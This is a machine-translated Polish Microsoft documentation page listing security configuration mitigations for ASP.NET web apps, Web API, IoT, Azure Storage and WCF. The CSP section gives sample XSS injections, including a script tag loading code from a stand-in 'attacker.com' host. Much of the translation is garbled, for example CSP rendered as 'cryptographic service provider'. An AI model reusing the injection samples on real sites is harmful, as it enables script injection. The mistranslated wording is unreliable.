---
title: Usługi konfiguracji zarządzania — narzędzie Microsoft Threat modelowania — Azure | Dokumentacja firmy Microsoft
description: środki zaradcze w przypadku zagrożeń widoczne w narzędziu modelowania zagrożeń
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: cea96234083abd01cdf280129e6f75a1f69af9c6
ms.sourcegitcommit: 150a40d8ba2beaf9e22b6feff414f8298a8ef868
ms.translationtype: MT
ms.contentlocale: pl-PL
ms.lasthandoff: 06/27/2018
ms.locfileid: "37028986"
---
# <a name="security-frame-configuration-management--mitigations"></a>Zabezpieczeń ramki: Zarządzanie konfiguracją | Środki zaradcze 
| Produktów i usług | Artykuł |
| --------------- | ------- |
| **Aplikacja sieci Web** | <ul><li>[Wdrożenie zasad zabezpieczeń zawartości (CSP), a następnie wyłącz wbudowanego javascript](#csp-js)</li><li>[Włącz filtr XSS przeglądarki](#xss-filter)</li><li>[Aplikacji programu ASP.NET, należy wyłączyć śledzenie i debugowanie przed wdrożeniem](#trace-deploy)</li><li>[Dostęp do innych firm JavaScript tylko z zaufanych źródeł](#js-trusted)</li><li>[Upewnij się, że uwierzytelniony stron ASP.NET dołączyć Redressing interfejsu użytkownika lub obrony miejsca kliknij](#ui-defenses)</li><li>[Upewnij się, że tylko zaufane źródła są dozwolone włączenie mechanizmu CORS w aplikacji sieci Web ASP.NET](#cors-aspnet)</li><li>[Włącz parametr ValidateRequest atrybutu stron ASP.NET](#validate-aspnet)</li><li>[Użyj lokalnie hostowanych najnowsze wersje bibliotek JavaScript](#local-js)</li><li>[Wyłącz automatyczne wykrywanie MIME](#mime-sniff)</li><li>[Usuń nagłówki standardowe serwera witryny sieci Web na systemu Windows Azure w celu uniknięcia odcisków](#standard-finger)</li></ul> |
| **Baza danych** | <ul><li>[Konfigurowanie Zapory systemu Windows dla dostępu aparatu bazy danych](#firewall-db)</li></ul> |
| **Interfejs API sieci Web** | <ul><li>[Zapewni, że tylko zaufane źródeł włączenie mechanizmu CORS w interfejsu API sieci Web ASP.NET](#cors-api)</li><li>[Szyfrowanie sekcji składnika Web API pliki konfiguracyjne, które zawierają dane poufne](#config-sensitive)</li></ul> |
| **Urządzenia IoT** | <ul><li>[Upewnij się, że wszystkich interfejsów administracyjnych są zabezpieczony z silnych poświadczeń](#admin-strong)</li><li>[Upewnij się, że nieznany kod nie można wykonać na urządzeniach](#unknown-exe)</li><li>[Szyfrowanie systemu operacyjnego i dodatkowe partycje urządzenia IoT z bitowego skrytki](#partition-iot)</li><li>[Upewnij się, że tylko minimalne usług/funkcji, które są włączone na urządzeniach](#min-enable)</li></ul> |
| **Pole IoT bramy** | <ul><li>[Szyfrowanie systemu operacyjnego i dodatkowe partycje IoT pola bramy z bitowego skrytki](#field-bit-locker)</li><li>[Upewnij się, że poświadczenia logowania domyślnej bramy pola są zmieniane podczas instalacji](#default-change)</li></ul> |
| **Brama chmury IoT** | <ul><li>[Upewnij się, że brama chmury implementuje procesu aktualności oprogramowania układowego połączonych urządzeń](#cloud-firmware)</li></ul> |
| **Granic zaufania maszyny** | <ul><li>[Upewnij się, że urządzenia mają skonfigurowane zgodnie z zasadami organizacji kontroli zabezpieczeń punktu końcowego](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Zapewnienia bezpiecznego zarządzania kluczami dostępu do magazynu Azure](#secure-keys)</li><li>[Zapewni, że tylko zaufane źródeł włączenie mechanizmu CORS w magazynie Azure](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Włącz usługę WCF dla funkcji ograniczania](#throttling)</li><li>[Ujawnienie informacji WCF za pomocą metadanych](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Wdrożenie zasad zabezpieczeń zawartości (CSP), a następnie wyłącz wbudowanego javascript

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Wprowadzenie do zasad zabezpieczeń zawartości](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [informacje o zasadach zabezpieczeń zawartości](http://content-security-policy.com/), [funkcje zabezpieczeń](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [wprowadzenie do zasad zabezpieczeń zawartości](https://docs.webplatform.org/wiki/tutorials/content-security-policy) , [Dostawcy usług Kryptograficznych można użyć?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Kroki** | <p>Zasady zabezpieczeń zawartości (CSP) jest obrony zabezpieczeń mechanizm zabezpieczeń, standard, W3C umożliwiającą właściciele aplikacji sieci web kontrolę zawartości osadzone w lokacji. Dostawca usług Kryptograficznych jest dodawana jako nagłówka odpowiedzi HTTP, na serwerze sieci web i jest wymuszane po stronie klienta przez przeglądarki. Jest zasady na podstawie listy dozwolonych — witryny sieci Web mogą zadeklarować zestaw zaufanych domen, z którego zawartość, takich jak JavaScript może zostać załadowany.</p><p>Dostawca usług Kryptograficznych zapewnia następujące korzyści zabezpieczeń:</p><ul><li>**Ochrona przed XSS:** Jeśli strona jest podatny na XSS, osoba atakująca może wykorzystać go w sposób 2:<ul><li>Wstaw `<script>malicious code</script>`. Lukę nie będzie działać z powodu Base dostawcy usług Kryptograficznych dla ograniczeń-1.</li><li>Wstaw `<script src=”http://attacker.com/maliciousCode.js”/>`. Lukę nie będzie działać, ponieważ nie będzie kontrolowane przez osobę atakującą domeny w dostawcy usług Kryptograficznych w dozwolonych domen</li></ul></li><li>**Kontrolę nad danych exfiltration:** Jeśli żadnych złośliwej zawartości sieci Web próbuje podłączyć się do zewnętrznej witryny sieci Web i kradzieży danych, połączenie zostanie przerwane przez dostawcy usług Kryptograficznych. Wynika to z faktu w docelowej domenie nie będzie dozwolonych dostawcy usług chmury</li><li>**Obrony przed miejsca kliknij:** miejsca kliknij to technika ataku przy użyciu której atakujący dokonuje można ramkę oryginalnego użytkowników witryny sieci Web i Wymuś do kliknięcia elementy interfejsu użytkownika. Obecnie obrony przed miejsca kliknij osiągnięte przez skonfigurowanie odpowiedzi nagłówka X-Frame-Options. Nie wszystkie przeglądarki przestrzegać tego nagłówka i przechodzi do przodu dostawcy usług Kryptograficznych jest standardowym sposobem obrony przed miejsca kliknij</li><li>**Raportowanie w czasie rzeczywistym ataku:** w przypadku ataku polegającego na iniekcji w witrynie sieci Web z obsługą dostawcy usług Kryptograficznych, przeglądarek automatycznie wyzwoli powiadomienia punkt końcowy skonfigurowany na serwerze sieci Web. Dzięki temu dostawca usług Kryptograficznych służy jako system ostrzeżenie w czasie rzeczywistym.</li></ul> |

### <a name="example"></a>Przykład
Przykład zasad: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Ta zasada umożliwia skryptów w celu załadowania tylko z serwera i google analytics serwera aplikacji sieci web. Skrypty załadowane z innych lokacji zostaną odrzucone. Gdy dostawca usług Kryptograficznych jest włączony w witrynie sieci Web, następujące funkcje są automatycznie wyłączane złagodzić atakom XSS. 

### <a name="example"></a>Przykład
Wbudowane skrypty nie zostanie wykonany. Poniżej przedstawiono przykłady wbudowanych skryptach 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Przykład
Ciągi jako kod nie zostanie obliczone. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Włącz filtr XSS przeglądarki

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Filtr XSS ochrony](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Kroki** | <p>Konfiguracja nagłówka odpowiedzi X XSS ochrony określa filtr skryptu krzyżowych w przeglądarce. Ten nagłówek odpowiedzi może mieć następujące wartości:</p><ul><li>`0:` Spowoduje to wyłączenie filtru</li><li>`1: Filter enabled` W przypadku wykrycia atak skryptowy między witrynami, aby zatrzymać ataku, przeglądarka będzie oczyszczenia strony</li><li>`1: mode=block : Filter enabled`. Zamiast niż oczyszczenia strony, po wykryciu ataków XSS, przeglądarka uniemożliwi renderowania strony</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. W przeglądarce zostanie oczyszczenia strony i Zgłoś naruszenie.</li></ul><p>Jest to funkcja chromu przy użyciu dostawcy usług Kryptograficznych naruszenie raportów szczegóły identyfikatora URI wybranych przez użytkownika. Opcje ostatnich 2 są uznawane za bezpieczne wartości.</p>|

## <a id="trace-deploy"></a>Aplikacji programu ASP.NET, należy wyłączyć śledzenie i debugowanie przed wdrożeniem

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Przegląd debugowania ASP.NET](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET śledzenie — Przegląd](http://msdn2.microsoft.com/library/bb386420.aspx), [jak: włączyć śledzenie aplikacji ASP.NET](http://msdn2.microsoft.com/library/0x5wc973.aspx), [porady: Włączanie debugowania dla aplikacji ASP.NET](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Kroki** | Gdy śledzenie jest włączone dla strony, co przeglądarki proces żądania również uzyskuje informacje o śledzeniu, zawierający dane dotyczące stanu wewnętrznego serwera i przepływ pracy. Te informacje można bezpieczeństwa poufnych. Gdy włączone jest debugowanie, strony, błędy wykonywane na serwerze powoduje stosu pełne dane śledzenia, przedstawionych w przeglądarce. Te dane mogą uwidaczniać informacje związane z zabezpieczeniami dotyczące serwera przepływu pracy. |

## <a id="js-trusted"></a>Dostęp do innych firm JavaScript tylko z zaufanych źródeł

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | skrypty JavaScript innych firm powinny odwoływać się tylko z zaufanych źródeł. Punkty końcowe odniesienia powinien być zawsze SSL. |

## <a id="ui-defenses"></a>Upewnij się, że uwierzytelniony stron ASP.NET dołączyć Redressing interfejsu użytkownika lub obrony miejsca kliknij

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Kliknij miejsca arkusza Cheat obrony OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [wewnętrzne IE - zwalczania miejsca kliknij z X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **Kroki** | <p>Kliknij miejsca, znanej także jako "interfejsu użytkownika odwoławcze ataku", jest gdy osoba atakująca używa wielu warstw przezroczystego lub nieprzezroczystego do nakłonienia użytkownika do kliknięcie przycisku lub łącze na innej stronie, gdy zostały zamiar kliknij na stronie najwyższego poziomu.</p><p>To nakładanie warstw uzyskuje się poprzez obsługuje tworzenie niebezpieczną stronę z elementem iframe, który jest ładowany atakowanym strony. W związku z tym osoba atakująca "przejmuje" kliknięć przeznaczone dla ich strony i kierować ich do innej strony, najprawdopodobniej należących do innej aplikacji, domeny lub oba. Aby zapobiec miejsca kliknij ataków, ustaw odpowiednie nagłówków odpowiedzi HTTP X-Frame-Options zawierający instrukcje przeglądarkę, aby nie zezwolić ramek z innych domen</p>|

### <a name="example"></a>Przykład
Nagłówek X-FRAME-OPTIONS można ustawić za pomocą pliku web.config usług IIS. Fragment kodu pliku Web.config dla witryny, które nigdy nie powinien być sformułowane: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Przykład
Kod pliku Web.config dla witryny, które powinny być obramowane tylko przez strony w tej samej domenie: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Upewnij się, że tylko zaufane źródła są dozwolone włączenie mechanizmu CORS w aplikacji sieci Web ASP.NET

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Web Forms, MVC5 |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | <p>Zabezpieczenia przeglądarki uniemożliwiają stronie internetowej wysyłanie żądań AJAX do innej domeny. To ograniczenie jest nazywany zasadami tego samego źródła i zapobiega złośliwa witryna odczytywanie danych poufnych z innej lokacji. Jednak czasami może być wymagane bezpieczne Uwidacznianie interfejsów API które innych witryn, jaką może wykorzystać. Krzyżowe CORS Origin Resource Sharing () jest standardem W3C, dzięki której serwer złagodzenie zasad tego samego źródła. Przy użyciu mechanizmu CORS, serwer można jawnie zezwolić na niektórych żądań cross-origin podczas odrzucenia innych użytkowników.</p><p>CORS jest bezpieczniejsze i bardziej elastyczne niż wcześniej technik, takich jak JSONP. Zasadniczo Włączanie mechanizmu CORS tłumaczy Dodawanie kilka nagłówków odpowiedzi HTTP (Access - Control-*) w sieci Web aplikacji, a to może odbywać się w na kilka sposobów.</p>|

### <a name="example"></a>Przykład
Jeśli dostęp do pliku Web.config jest dostępny, CORS, mogą być dodawane przy użyciu następującego kodu: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Przykład
Jeśli dostęp do pliku web.config jest niedostępny, CORS można skonfigurować przez dodanie poniższego kodu CSharp: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Należy pamiętać, że jest krytyczne, aby upewnić się, że lista zawiera źródła w atrybucie "Access-Control-Allow-Origin" jest ustawiona na zestaw skończona i zaufanych źródeł. Można to skonfigurować niewłaściwie (np. ustawienie wartości jako ' *') umożliwi złośliwych witryn do wyzwolenia krzyżowego pochodzenia żądania do aplikacji sieci web > bez ograniczeń, dzięki czemu narażony na ataki CSRF aplikacji. 

## <a id="validate-aspnet"></a>Włącz parametr ValidateRequest atrybutu stron ASP.NET

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Web Forms, MVC5 |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Żądanie sprawdzania poprawności - zapobieganie atakom skryptu](http://www.asp.net/whitepapers/request-validation) |
| **Kroki** | <p>Weryfikacja żądania, funkcji programu ASP.NET od wersji 1.1, zapobiega akceptowanie zawartości zawierającego HTML bez zakodowanego przez serwer. Ta funkcja została zaprojektowana, aby zapobiec atakom niektórych uruchomienie skryptu, zgodnie z którymi kodu skryptu klienta lub HTML może być nieświadomie przesłać na serwer, przechowywane i następnie widoczne dla innych użytkowników. Nadal zdecydowanie zaleca się zweryfikowanie wszystkich danych wejściowych, a kodowanie HTML, gdy jest to odpowiednie.</p><p>Weryfikacja żądania jest wykonywane na podstawie porównania ilości wszystkie dane wejściowe do listy potencjalnie niebezpiecznych wartości. W przypadku dopasowania ASP.NET zgłasza `HttpRequestValidationException`. Domyślnie funkcja Weryfikacja żądania jest włączona.</p>|

### <a name="example"></a>Przykład
Jednak ta funkcja może zostać wyłączona na poziomie strony: 
```XML
<%@ Page validateRequest="false" %> 
```
lub na poziomie aplikacji 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Sprawdź należy pamiętać, że funkcja weryfikacji żądania nie jest obsługiwane i nie jest częścią MVC6 potoku. 

## <a id="local-js"></a>Użyj lokalnie hostowanych najnowsze wersje bibliotek JavaScript

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | ND  |
| **Kroki** | <p>Deweloperzy przy użyciu standardowej biblioteki języka JavaScript, np. JQuery należy użyć zatwierdzone wersji wspólne biblioteki JavaScript, które nie zawierają luk w zabezpieczeniach znane. Dobrym rozwiązaniem jest Użyj najbardziej najnowszej wersji biblioteki, ponieważ zawierają one poprawki zabezpieczeń dla znanych luk w zabezpieczeniach w ich starszych wersji.</p><p>Jeśli nie można użyć najnowszej wersji z powodu ze względu na zgodność poniżej minimalnej wersji powinien być używany.</p><p>Dopuszczalne minimalne wersje:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>1.9 weryfikacji JQuery</li><li>JQuery Mobile 1.0.1</li><li>Cykl JQuery 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Zestaw narzędzi kontroli AJAX**<ul><li>Zestaw narzędzi kontroli AJAX 40412</li></ul></li><li>**Formularze sieci Web ASP.NET i Ajax**<ul><li>Formularze sieci Web ASP.NET i Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nigdy nie załadować żadnej biblioteki JavaScript z zewnętrznych witryn, takie jak publiczny CDN</p>|

## <a id="mime-sniff"></a>Wyłącz automatyczne wykrywanie MIME

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Część zabezpieczeń programu IE 8 V: kompleksową ochronę](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [typ MIME](http://en.wikipedia.org/wiki/Mime_type) |
| **Kroki** | Nagłówek X-Content-typu-Options jest nagłówka HTTP, dzięki której deweloperzy mogą określić, że jego zawartość nie powinny być ten sposób MIME. Celem jest ograniczenie liczby ataków wykrywanie MIME tego nagłówka. Dla każdej strony zawierających zawartość sterowane użytkownika, należy użyć nagłówka HTTP X-zawartości — typ — opcje: nosniff. Aby włączyć wymaganego nagłówka globalnie do wszystkich stron w aplikacji, można wykonać jedną z następujących|

### <a name="example"></a>Przykład
Dodaj nagłówek w pliku web.config, gdy aplikacja jest obsługiwana przez Internet Information Services (IIS) 7 i jego nowszych wersjach. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Przykład
Dodaj nagłówek za pośrednictwem aplikacji globalne\_powstaniem zdarzenia BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Przykład
Implementowanie niestandardowego modułu HTTP 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Przykład
Można włączyć wymaganego nagłówka tylko dla określonych stron przez dodanie go do poszczególnych odpowiedzi: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Usuń nagłówki standardowe serwera witryny sieci Web na systemu Windows Azure w celu uniknięcia odcisków

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Aplikacja sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | EnvironmentType - Azure |
| **Odwołania**              | [Usuwanie serwera standardowych nagłówków w witrynach sieci Web systemu Windows Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Kroki** | Nagłówki, takim jak serwer X-zasilane-przez X AspNet wersji ujawnić informacje dotyczące serwera i technologie podstawowej. Zalecane jest aby pominąć te nagłówki, co uniemożliwia odcisków aplikacji |

## <a id="firewall-db"></a>Konfigurowanie Zapory systemu Windows dla dostępu aparatu bazy danych

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Database (Baza danych) | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | Lokalnego programu SQL Azure |
| **Atrybuty**              | N/d, SQL - 12 |
| **Odwołania**              | [Jak skonfigurować zaporę bazy danych Azure SQL](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Konfigurowanie Zapory systemu Windows dla dostępu aparatu bazy danych](https://msdn.microsoft.com/library/ms175043) |
| **Kroki** | Systemy zapory pomagać w zapobieganiu nieautoryzowanego dostępu do zasobów komputera. Aby uzyskać dostęp do wystąpienia aparatu bazy danych programu SQL Server przez zaporę, należy skonfigurować zaporę na komputerze z uruchomionym serwerem SQL, aby zezwolić na dostęp |

## <a id="cors-api"></a>Zapewni, że tylko zaufane źródeł włączenie mechanizmu CORS w interfejsu API sieci Web ASP.NET

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | MVC 5 |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Włączanie żądań Cross-Origin w składniku ASP.NET Web API 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API — Obsługa mechanizmu CORS w składniku ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Kroki** | <p>Zabezpieczenia przeglądarki uniemożliwiają stronie internetowej wysyłanie żądań AJAX do innej domeny. To ograniczenie jest nazywany zasadami tego samego źródła i zapobiega złośliwa witryna odczytywanie danych poufnych z innej lokacji. Jednak czasami może być wymagane bezpieczne Uwidacznianie interfejsów API które innych witryn, jaką może wykorzystać. Krzyżowe CORS Origin Resource Sharing () jest standardem W3C, dzięki której serwer złagodzenie zasad tego samego źródła.</p><p>Przy użyciu mechanizmu CORS, serwer można jawnie zezwolić na niektórych żądań cross-origin podczas odrzucenia innych użytkowników. CORS jest bezpieczniejsze i bardziej elastyczne niż wcześniej technik, takich jak JSONP.</p>|

### <a name="example"></a>Przykład
W App_Start/WebApiConfig.cs Dodaj następujący kod do metody WebApiConfig.Register 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Przykład
Atrybut EnableCors można zastosować do metody akcji w kontrolerze w następujący sposób: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Należy pamiętać, że jest krytyczne, aby upewnić się, że lista zawiera źródła w atrybucie EnableCors jest ustawiona na zestaw skończona i zaufanych źródeł. Nie można skonfigurować niewłaściwie (np. ustawienie wartości jako "*") umożliwi złośliwych witryn do wyzwolenia krzyżowego pochodzenia żądania interfejsu API bez żadnych ograniczeń > dzięki czemu narażony na ataki CSRF interfejsu API. EnableCors może korzystać na poziomie kontrolera. 

### <a name="example"></a>Przykład
Aby wyłączyć CORS dla określonej metody w klasie, atrybut DisableCors mogą być używane w sposób przedstawiony poniżej: 
```csharp
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Kompilacja |  
| **Zastosowanie technologii** | MVC 6 |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Włączanie żądań między źródłami (CORS) w platformy ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Kroki** | <p>W programie ASP.NET Core 1.0 CORS można włączyć za pomocą oprogramowania pośredniczącego albo przy użyciu platformy MVC. W przypadku używania MVC do włączenia CORS są używane te same usługi CORS, ale nie jest oprogramowanie pośredniczące CORS.</p>|

**Podejście 1** Włączanie mechanizmu CORS z oprogramowania pośredniczącego: Aby włączyć mechanizm CORS dla całej aplikacji Dodaj oprogramowanie pośredniczące CORS do potoku żądania przy użyciu metody rozszerzenia UseCors. Podczas dodawania oprogramowanie pośredniczące CORS za pomocą klasy CorsPolicyBuilder można określić zasady cross-origin. Istnieją dwa sposoby, w tym:

### <a name="example"></a>Przykład
Pierwsza to wywołanie UseCors z wyrażenia lambda. Wyrażenie lambda ma obiekt CorsPolicyBuilder: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Przykład
Drugim jest zdefiniować co najmniej jedne zasady CORS nazwanego, a następnie wybierz zasady według nazwy w czasie wykonywania. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Podejście 2** Włączanie mechanizmu CORS w nazwie wzorca MVC: deweloperzy mogą również używać MVC do zastosowania określonego CORS każdej akcji, każdy kontroler lub globalnie do wszystkich kontrolerów.

### <a name="example"></a>Przykład
Każdej akcji: Aby określić CORS zasad dla określonej akcji Dodaj atrybut [EnableCors] do akcji. Określ nazwę zasady. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Przykład
Na kontrolerze: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Przykład
Globalnie: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Należy pamiętać, że jest krytyczne, aby upewnić się, że lista zawiera źródła w atrybucie EnableCors jest ustawiona na zestaw skończona i zaufanych źródeł. Nie można skonfigurować niewłaściwie (np. ustawienie wartości jako "*") umożliwi złośliwych witryn do wyzwolenia krzyżowego pochodzenia żądania interfejsu API bez żadnych ograniczeń > dzięki czemu narażony na ataki CSRF interfejsu API. 

### <a name="example"></a>Przykład
Aby wyłączyć CORS dla kontrolera lub akcji, należy użyć atrybutu [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Szyfrowanie sekcji składnika Web API pliki konfiguracyjne, które zawierają dane poufne

| Stanowisko                   | Szczegóły      |
| ----------------------- | ------------ |
| **Składnik**               | Interfejs API sieci Web | 
| **Faza SDL**               | Wdrożenie |  
| **Zastosowanie technologii** | Ogólny |
| **Atrybuty**              | ND  |
| **Odwołania**              | [Porady: Szyfrowanie sekcji konfiguracyjnych w DPAPI za pomocą programu ASP.NET 2.0](https://msdn.microsoft.com/library/ff647398.aspx), [określenie dostawcę konfiguracji chronione](https://msdn.microsoft.com/library/68ze1hb2.aspx), [przy użyciu usługi Azure Key Vault ochronę kluczy tajnych w aplikacji](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
